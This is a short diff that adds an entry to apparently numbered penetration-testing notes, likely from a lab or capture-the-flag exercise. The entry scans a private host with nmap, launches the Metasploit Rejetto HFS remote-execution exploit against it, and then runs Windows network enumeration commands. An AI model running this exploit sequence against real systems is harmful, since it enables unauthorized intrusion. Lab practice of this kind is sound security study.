@@ -1819,9 +1819,21 @@ net user administrator
 net localgroup
 net localgroup administrators
 ```
+95) Enumerating Network Information
 
-
-
+```
+nmap -sV 10.2.20.137
+searchsploit rejetto
+msfconsole
+use exploit/windows/http/rejetto_hsf_exec
+set RHOSTS 10.2.20.137
+exploit
+ipconfig
+ipconfig /all
+route print
+arp -a
+netstat -ano
+```
 
 
 
